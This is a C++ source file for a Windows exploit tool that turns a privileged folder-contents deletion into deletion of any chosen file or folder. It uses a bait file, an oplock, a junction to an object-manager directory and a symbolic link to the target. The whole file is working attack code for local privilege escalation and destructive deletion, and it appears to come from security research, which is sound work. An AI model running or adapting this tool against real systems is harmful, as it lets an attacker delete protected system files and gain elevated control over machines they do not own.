#include <Windows.h>

#include <exception>
#include <filesystem>
#include <format>
#include <fstream>
#include <iostream>
#include <string>
#include <string_view>
#include <vector>

using namespace std::string_literals;

import offwinlib;

static void print_usage()
{
	std::wcout << L"Usage: FolderContentsDeleteToArbitraryDelete.exe file|folder VULNERABLE_FOLDER TARGET_FILE_OR_FOLDER" << std::endl;
}

int wmain(int argc, wchar_t* argv[])
{
	try
	{
		std::vector<std::wstring_view> args(argv, argv + argc);
		if (args.size() < 4)
		{
			print_usage();
			return 1;
		}

		const auto& target_type = args[1];
		const auto& initial_folder = args[2];
		const auto& target = args[3];

		bool target_is_folder = (target_type == L"folder");
		if (!target_is_folder && target_type != L"file")
		{
			print_usage();
			return 1;
		}

		auto bait_folder = std::wstring{initial_folder} + LR"(\)" + owl::misc::generate_uuid().substr(0, 8);
		auto bait_filename = owl::misc::generate_uuid().substr(0, 8);
		auto bait_file = bait_folder + LR"(\)" + bait_filename;
		std::wcout << std::format(L"[*] Creating bait folder/file {}...", bait_file) << std::endl;
		std::filesystem::create_directory(bait_folder);
		std::ofstream{bait_file}.close();
		std::wcout << L"[+] Bait folder/file created." << std::endl;

		std::wcout << L"[*] Setting oplock on bait file..." << std::endl;
		auto oplock_data = owl::oplock::set_oplock(bait_file, 0, true, GENERIC_READ | DELETE, true);
		std::wcout << L"[+] Oplock set." << std::endl;

		std::wcout << L"[*] Waiting for file deletion to trigger oplock..." << std::endl;
		oplock_data.trigger.wait();
		std::wcout << L"[+] Oplock triggered." << std::endl;

		std::wcout << L"[*] Moving bait file to temp dir..." << std::endl;
		auto new_path = owl::misc::move_to_temp_dir(oplock_data.handle.get());
		std::wcout << std::format(L"[+] Bait file moved to {}.", new_path) << std::endl;

		auto directory_object = LR"(\BaseNamedObjects)"s;
		std::wcout << std::format(L"[*] Creating directory object in {}...", directory_object) << std::endl;
		directory_object += LR"(\)" + owl::misc::generate_uuid();
		auto directory_handle = owl::object_manager::create_directory_object(directory_object);
		std::wcout << std::format(L"[+] Directory object created: {}", directory_object) << std::endl;

		std::wcout << L"[*] Turning bait folder into junction pointing to directory object..." << std::endl;
		owl::junction::create_junction(bait_folder, directory_object);
		std::wcout << L"[+] Junction created." << std::endl;

		auto symlink_path = directory_object + LR"(\)" + bait_filename;
		auto target_nt = LR"(\??\)"s.append(target);
		if (target_is_folder)
		{
			target_nt += L"::$INDEX_ALLOCATION";
		}
		std::wcout << std::format(L"[*] Creating symlink from {} to {}...", symlink_path, target_nt) << std::endl;
		auto symlink_handle = owl::object_manager::create_object_manager_symlink(symlink_path, target_nt);
		std::wcout << L"[+] Symlink created." << std::endl;

		std::wcout << L"[*] Releasing oplock..." << std::endl;
		oplock_data.handle.reset();
		std::wcout << L"[+] Oplock released. Press enter to clean up...";
		std::cin.get();
	}
	catch (const std::exception& e)
	{
		std::wcout << L"[-] " << e.what() << std::endl;
		return 1;
	}

	return 0;
}
